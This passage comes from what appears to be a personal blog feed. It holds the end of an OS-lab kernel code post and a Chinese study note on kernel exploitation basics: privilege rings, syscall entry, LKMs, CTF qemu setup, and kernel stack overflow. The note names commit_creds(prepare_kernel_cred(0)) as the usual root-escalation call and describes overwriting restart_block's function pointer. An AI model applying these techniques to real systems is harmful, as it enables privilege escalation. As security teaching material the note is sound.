class="line"><span class="keyword">if</span> (!*p || *p == current)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;father != current-&gt;pid)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (pid&gt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;pid != pid)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;pgrp != current-&gt;pgrp)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;pgrp != -pid)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> ((*p)-&gt;state) &#123;</span><br><span class="line"><span class="keyword">case</span> TASK_STOPPED:</span><br><span class="line"><span class="keyword">if</span> (!(options &amp; WUNTRACED))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">put_fs_long(<span class="number">0x7f</span>,stat_addr);</span><br><span class="line"><span class="keyword">return</span> (*p)-&gt;pid;</span><br><span class="line"><span class="keyword">case</span> TASK_ZOMBIE:</span><br><span class="line">current-&gt;cutime += (*p)-&gt;utime;</span><br><span class="line">current-&gt;cstime += (*p)-&gt;stime;</span><br><span class="line">flag = (*p)-&gt;pid;</span><br><span class="line">code = (*p)-&gt;exit_code;</span><br><span class="line">release(*p);</span><br><span class="line">put_fs_long(code,stat_addr);</span><br><span class="line"><span class="keyword">return</span> flag;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag) &#123;</span><br><span class="line"><span class="keyword">if</span> (options &amp; WNOHANG)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">current-&gt;state=TASK_INTERRUPTIBLE;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tW\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">if</span> (!(current-&gt;signal &amp;= ~(<span class="number">1</span>&lt;&lt;(SIGCHLD<span class="number">-1</span>))))</span><br><span class="line"><span class="keyword">goto</span> repeat;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> -EINTR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -ECHILD;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>太难了太难了，内核太难了……</p>]]></content>
      
      
      
        <tags>
            
            <tag> os </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel-pwn基础知识学习</title>
      <link href="2021/08/10/kernal-pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"/>
      <url>2021/08/10/kernal-pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>原文：<a href="https://www.anquanke.com/post/id/201043">https://www.anquanke.com/post/id/201043</a></p><p>照着原文手打了一遍，印象加深get</p><h2 id="02-kernel简介"><a href="#02-kernel简介" class="headerlink" title="02. kernel简介"></a>02. kernel简介</h2><h3 id="什么是kernel"><a href="#什么是kernel" class="headerlink" title="什么是kernel"></a>什么是kernel</h3><p>kernel也是一个程序，用来管理软件发出的数据的IO要求，将这些要求转义为指令，交给CPU和计算机的其他组件处理，kernel是现代操作系统最基本的部分。</p><p><img src="https://img.lhyerror404.cn/error404/2020-03-13-Kernel_Layout.svg" alt=""></p><p>kernel最主要的功能有两点：</p><ol><li>控制并与硬件进行交互</li><li>提供application能运行的环境</li></ol><p>包括IO，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。</p><p>需要注意的是，kernel的crash通常会引起重启。</p><h3 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h3><p>intel CPU将CPU的特权级别分为4个级别：Ring 0，Ring 1，Ring 2，Ring 3.</p><p>Ring 0只给OS使用，Ring 3所有程序都可以使用，内层Ring 可以随便使用外层Ring的资源。</p><p>使用Ring Model是为了提升系统安全性，例如某个间谍软件作为一个在Ring 3运行的用户程序，在不通知用户的时候打开摄像头会被组成，因为访问硬件需要使用being驱动程序保留的Ring 1的方法。</p><p>大多数的现代操作系统只使用了Ring 0和Ring 3.</p><h3 id="model-change"><a href="#model-change" class="headerlink" title="model change"></a>model change</h3><h4 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h4><p>当发生系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换时，具体过程为：</p><ol><li><p>通过<code>swapgs</code>切换GS段寄存器，将GS寄存器的值和一个特定位置的值进行交换，目的是保存GS值，同时将该位置的值作为内核执行时的GS值使用。</p></li><li><p>将当前栈顶（用户空间栈顶）记录在CPU独占变量区域里，将CPU独占区域里记录的内核放入RSP/ESP</p></li><li><p>通过push保存各寄存器值，代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 *&#x2F;</span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line">&#x2F;* 保存栈值，并设置内核栈 *&#x2F;</span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">&#x2F;* 通过push保存寄存器值，形成一个pt_regs结构 *&#x2F;</span><br><span class="line">&#x2F;* Construct struct pt_regs on stack *&#x2F;</span><br><span class="line">pushq  $__USER_DS                &#x2F;* pt_regs-&gt;ss *&#x2F;</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  &#x2F;* pt_regs-&gt;sp *&#x2F;</span><br><span class="line">pushq  %r11                      &#x2F;* pt_regs-&gt;flags *&#x2F;</span><br><span class="line">pushq  $__USER_CS                &#x2F;* pt_regs-&gt;cs *&#x2F;</span><br><span class="line">pushq  %rcx                      &#x2F;* pt_regs-&gt;ip *&#x2F;</span><br><span class="line">pushq  %rax                      &#x2F;* pt_regs-&gt;orig_ax *&#x2F;</span><br><span class="line">pushq  %rdi                      &#x2F;* pt_regs-&gt;di *&#x2F;</span><br><span class="line">pushq  %rsi                      &#x2F;* pt_regs-&gt;si *&#x2F;</span><br><span class="line">pushq  %rdx                      &#x2F;* pt_regs-&gt;dx *&#x2F;</span><br><span class="line">pushq  %rcx tuichu               &#x2F;* pt_regs-&gt;cx *&#x2F;</span><br><span class="line">pushq  $-ENOSYS                  &#x2F;* pt_regs-&gt;ax *&#x2F;</span><br><span class="line">pushq  %r8                       &#x2F;* pt_regs-&gt;r8 *&#x2F;</span><br><span class="line">pushq  %r9                       &#x2F;* pt_regs-&gt;r9 *&#x2F;</span><br><span class="line">pushq  %r10                      &#x2F;* pt_regs-&gt;r10 *&#x2F;</span><br><span class="line">pushq  %r11                      &#x2F;* pt_regs-&gt;r11 *&#x2F;</span><br><span class="line">sub $(6*8), %rsp                 &#x2F;* pt_regs-&gt;bp, bx, r12-15 not saved *&#x2F;</span><br></pre></td></tr></table></figure></li><li><p>通过汇编指令判断是否为 <code>x32_abi</code>。</p></li><li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p></li></ol><h4 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h4><p>退出时，流程如下：</p><ol><li>通过swapgs恢复GS值</li><li>通过sysretq或者iretq恢复到用户控件继续执行。如果使用iretq还需要给出用户空间的一些信息（cs，eflags/rflags，esp/rsp等）</li></ol><h4 id="关于syscall"><a href="#关于syscall" class="headerlink" title="关于syscall"></a>关于syscall</h4><p>系统调用，指的是用户控件的程序向操作系统内核请求需要更高权限的服务，比如IO操作或者进程间通信。系统调用提供用户程序与操作系统之间的接口，部分库函数（如scanf，puts等IO相关的函数实际上是对系统调用的封装（read和write））</p><blockquote><p>在 <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> 和 <em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。</p></blockquote><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><p>在man手册中，关于这个函数的说明如下：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line">SYNOPSIS</span><br><span class="line">       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line">       <span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span>;</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       <span class="function">The <span class="title">ioctl</span><span class="params">()</span> system call manipulates the underlying device parameters of special</span></span><br><span class="line">       files.  In particular, many  operating  characteristics  of  character  special</span><br><span class="line">       files  (e.g., terminals) <span class="function">may be controlled with <span class="title">ioctl</span><span class="params">()</span> requests.  The argument</span></span><br><span class="line"><span class="function">       fd must be an open file descriptor.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line">       The second argument is a device-dependent request code.  The third argument  is</span><br><span class="line">       an  untyped  pointer  to  memory.  It<span class="number">&#x27;</span><span class="function">s traditionally <span class="keyword">char</span> *<span class="title">argp</span> <span class="params">(from the days</span></span></span><br><span class="line">       before void * was valid C), and will be so named for this discussion.</span><br><span class="line"></span><br><span class="line">       <span class="function">An <span class="title">ioctl</span><span class="params">()</span> request has encoded in it whether the argument is an in parameter <span class="keyword">or</span></span></span><br><span class="line">       out  parameter, and the size of the argument argp in bytes.  Macros and defines</span><br><span class="line">       used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.</span><br></pre></td></tr></table></figure><p>可以看出ioctl也是一个系统调用，用于与设备通信。</p><p>第一个参数为打开设备返回的文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。</p><blockquote><p>使用 ioctl 进行通信的原因：</p><p>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适, 有时候用户模式可能需要直接访问设备。</p><p>比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。</p><p>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</p></blockquote><p>（妙啊）</p><h3 id="内核态函数调用"><a href="#内核态函数调用" class="headerlink" title="内核态函数调用"></a>内核态函数调用</h3><p>相比用户态函数，内核态的函数有了一些变化：</p><ol><li>printf变更为printk，值得注意的是printk不一定会把内容显示到终端上，<strong>但是一定在内核缓冲区里</strong>，可以通过<code>dmesg</code>查看效果</li><li>memcpy变更为copy_from_user/copy_to_user<ol><li>Copy_from_user实现了将用户空间的数据传送到内核空间</li><li>Copy_to_user实现了将内核空间的数据传送到用户空间</li></ol></li><li>malloc变更为kmalloc，内核态的内存分配函数，和malloc相似，但使用的是slab/slub分配器</li><li>free变更为kfree，同kmalloc</li></ol><p>同时，kernel负责管理进程，因此kernel也记录了进程的权限。kernel中有两个可以方便的改变权限的函数：</p><ol><li><code>int commit_creds(struct cred *new)</code></li><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code></li></ol><p>从函数名也可以看出，执行commit_creds(prepare_kernel_cred(0))即获得root权限，0表示以0号进程作为参考准备新的credentials</p><p>执行commit_creds(prepare_kernel_cred(0))也是最常用的提权手段，两个函数的地址都可以在/proc/kallsyms中查看（较老的内核版本中是/proc/ksyms）</p><p><img src="/Users/lemon/Library/Application Support/typora-user-images/image-20210811161724893.png" alt="image-20210811161724893" style="zoom:50%;" /></p><p>一般情况下，/proc/kallsyms的内容需要root权限才能查看，若以非root权限查看将显示为0地址（emm）</p><h3 id="struct-cred-进程权限结构体"><a href="#struct-cred-进程权限结构体" class="headerlink" title="struct cred - 进程权限结构体"></a>struct cred - 进程权限结构体</h3><p>内核使用cred结构体记录进程的权限，每个进程中都有一个cred结构，这个结构保存了该进程的权限等信息（uid，gid等），如果能修改某个进程的cred，那么也就修改了这个进程的权限。结构体源码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;           <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;                   <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;                   <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;                  <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;                  <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;                  <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;                  <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;                 <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;                 <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits;            <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable;   <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;     <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;     <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;          <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;       <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;       <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">    /* keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span>      <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span>       <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span>     <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;             <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>          <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span>    <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>     <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>               <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="内核保护机制"><a href="#内核保护机制" class="headerlink" title="内核保护机制"></a>内核保护机制</h3><ol><li>smep: Supervisor Mode Execute Protection，当处理器处于ring 0模式，执行用户空间的代码会触发页错误（在arm中该保护称为PXN）。</li><li>smap: Supervisor Mode Access Protection，类似于smep，当处理器处于ring 0模式，访问用户空间的数据会发生页错误。</li><li>MMAP_MIN_ADDR: 控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li><li>KASLR: Kernel Address Space Layout Randomization，内核地址空间布局随机化，开启后，允许kernel image加载到VMALLOC区域的任何位置。</li></ol><p>Canary，DEP，PIE，RELRO等保护与用户态原理和作用相同。</p><h2 id="03-LKMs介绍"><a href="#03-LKMs介绍" class="headerlink" title="03. LKMs介绍"></a>03. LKMs介绍</h2><h3 id="什么是LKMs"><a href="#什么是LKMs" class="headerlink" title="什么是LKMs"></a>什么是LKMs</h3><p>LKMs (Loadable Kernel Modules)称为可加载核心模块(内核模块)， 其可以看作是运行在内核空间的可执行程序，包括：</p><ul><li>驱动程序 Device drivers<ul><li>设备驱动</li><li>文件系统驱动</li><li>……</li></ul></li><li>内核扩展模块 modules</li></ul><p>LKMs的文件格式和用户态的可执行程序相同，Linux下为ELF，Windows下为exe/dll，mac下为MACH-O，因此可以使用IDA等工具来分析内核模块。</p><p>模块可以被单独编译，但是不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程不同。</p><p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p><blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p></blockquote><p><strong>通常情况下，Kernel漏洞的发生也常见于加载的LKMs出现问题。</strong></p><h3 id="内核中的模块相关命令"><a href="#内核中的模块相关命令" class="headerlink" title="内核中的模块相关命令"></a>内核中的模块相关命令</h3><ol><li>insmod：将指定模块加载到内核中。</li><li>rmmod：从内核中卸载指定模块。</li><li>lsmod：列出已经加载的模块。</li><li>modprobe：添加或删除模块，modprobe在加载模块时会查找依赖关系。</li></ol><h3 id="file-operations-结构体"><a href="#file-operations-结构体" class="headerlink" title="file_operations 结构体"></a>file_operations 结构体</h3><p>用户进程在对设备文件进行诸如read/write操作的时候，<strong>系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是linux的设备驱动程序工作的基本原理。</strong></p><p>内核模块程序的结构中包括一些call back回调表，对应的函数存储在一个file_operations(fop)结构体中，这也是相当重要的结构体，结构体中实现了的回调函数就会静态初始化函数地址，而未实现的函数，值为NULL。</p><p>例如：</p><div class="table-container"><table><thead><tr><th style="text-align:center">Events</th><th style="text-align:center">User functions</th><th style="text-align:center">Kernel functions</th></tr></thead><tbody><tr><td style="text-align:center">Load</td><td style="text-align:center">insmod</td><td style="text-align:center">module_init()</td></tr><tr><td style="text-align:center">Open</td><td style="text-align:center">fopen</td><td style="text-align:center">file_operations: open</td></tr><tr><td style="text-align:center">Close</td><td style="text-align:center">fread</td><td style="text-align:center">file_operations: read</td></tr><tr><td style="text-align:center">Write</td><td style="text-align:center">fwrite</td><td style="text-align:center">file_operations: write</td></tr><tr><td style="text-align:center">Close</td><td style="text-align:center">fclose</td><td style="text-align:center">file_operations: release</td></tr><tr><td style="text-align:center">Remove</td><td style="text-align:center">rmmod</td><td style="text-align:center">module_exit()</td></tr></tbody></table></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Hello world!n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt; Bye, cruel worldn&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">module_fops</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">    read: module_read,</span><br><span class="line">    write: module_write,</span><br><span class="line">    open: module_open,</span><br><span class="line">    release: module_release</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中，module_init/module_exit是在载入/卸载这个驱动时自动运行；而fop结构体实现了如上四个callback，冒号右侧的函数名是由开发者自己起的，在驱动程序载入内核后，其他用户程序就可以借助文件方式像进行系统调用一样调用这些函数实现所需功能。</p><h2 id="04-环境配置"><a href="#04-环境配置" class="headerlink" title="04. 环境配置"></a>04. 环境配置</h2><p>对于kernel pwn来说，题目通常会给定以下文件：</p><blockquote><p>boot.sh：一个用于启动kernel的shell脚本，多用qemu，保护措施与qemu不同的启动参数有关</p><p>bzImage：kernel binary</p><p>rootfs.cpio：文件系统映像</p></blockquote><p>qemu的启动参数：</p><ul><li>-initrd rootfs.cpio，使用rootfs.cpio作为内核启动的文件系统</li><li>-kernel bzImage，使用bzImage作为kernel映像</li><li>-cpu kvm64,+smep，设置CPU的安全选项，这里开启了smep</li><li>-m 64M，设置虚拟RAM为64M，默认为128M</li></ul><h2 id="05-Kernel-Stack-Overflow"><a href="#05-Kernel-Stack-Overflow" class="headerlink" title="05. Kernel Stack Overflow"></a>05. Kernel Stack Overflow</h2><h3 id="内核栈帧-Kernel-Stack-Layout"><a href="#内核栈帧-Kernel-Stack-Layout" class="headerlink" title="内核栈帧(Kernel Stack Layout)"></a>内核栈帧(Kernel Stack Layout)</h3><p>x86上的Linux内核堆栈的大小为4096或8192字节，取决于发行版。</p><p>内核堆栈与thread_info结构共享4k/8k的总大小，该结构包含有关当前线程的一些元数据，如include/linux/sched.h中所示</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">thread_union</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>thread_info结构体在x86下有如下定义（arch/x86/include/asm/thread_info.h）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exec_domain</span> *<span class="title">exec_domain</span>;</span></span><br><span class="line">    __u32      flags;</span><br><span class="line">    __u32      status;</span><br><span class="line">    __u32      cpu;</span><br><span class="line">    <span class="keyword">int</span>          preempt_count;</span><br><span class="line">    <span class="keyword">mm_segment_t</span>  addr_limit;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> <span class="title">restart_block</span>;</span></span><br><span class="line">    <span class="keyword">void</span> __user     *sysenter_return;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_32</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  previous_esp;</span><br><span class="line">    __u8      supervisor_stack[<span class="number">0</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span>          uaccess_err;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>内核堆栈在内存中呈现下所示的结构</p><p><img src="https://img.lhyerror404.cn/error404/2020-03-15-061423.png" alt=""></p><p>当内核函数需要超过4k/8k的堆栈空间或者使用了长调用链以至于超出可用堆栈空间的时候，会导致堆栈溢出的发生，并且如果thread_info结构或超出更低地址处的关键内存损坏，则会导致内核崩溃。但是，如果内存对齐并且存在实际可以控制写入堆栈及其以外的数据的情况，则可能存在可利用的条件。</p><h3 id="kernel栈溢出攻击"><a href="#kernel栈溢出攻击" class="headerlink" title="kernel栈溢出攻击"></a>kernel栈溢出攻击</h3><p>我们看一看栈溢出和thread_info结构的破坏是如何导致提权的发生的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">blah</span><span class="params">(<span class="keyword">int</span> __user *vals, <span class="keyword">int</span> __user count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">int</span> big_array[count];</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; count; ++count) &#123;</span><br><span class="line">    big_array[i] = vals[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码使用了可变长度的数组，其大小基于攻击者的count。c99允许使用可变长的数组，并且GCC支持可变长的数组。GCC将在运行的时候简单地计算必要的大小，并适当减少堆栈指针，以在堆栈上为数组分配空间。</p><p>我们如果提供一个极大的count，则堆栈可能向下扩展到thread_info的边界之外，从而允许攻击者随后将任意值写入该结构。</p><p>我们可以利用的target为thread_info结构中的一个成员：restart_block。该成员是每个线程的结构，用于跟踪信息和参数以供重新启动系统调用。如果在sigaction(2)中指定了SA_RESTART，则被信号中断的系统调用可以中止并返回EINTR，也可以自动自行重启。在include/linux/thread_info.h中，restart_block的定义如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(struct restart_block *);</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">/* For futex_wait and futex_wait_requeue_pi */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; futex;</span><br><span class="line">        <span class="comment">/* For nanosleep */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; nanosleep;</span><br><span class="line">        <span class="comment">/* For poll */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; poll;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里有一个fn的函数指针，在kernel/signal.c中有如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE0(restart_syscall)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> *<span class="title">restart</span> =</span> &amp;current_thread_info()-&gt;restart_block;</span><br><span class="line">    <span class="keyword">return</span> restart-&gt;fn(restart);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而restart_syscall在arch/x86/kernel/syscall_table_32.S中被定义：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.<span class="keyword">long</span> sys_restart_syscall <span class="comment">/* 0 - old &quot;setup()&quot; system call, 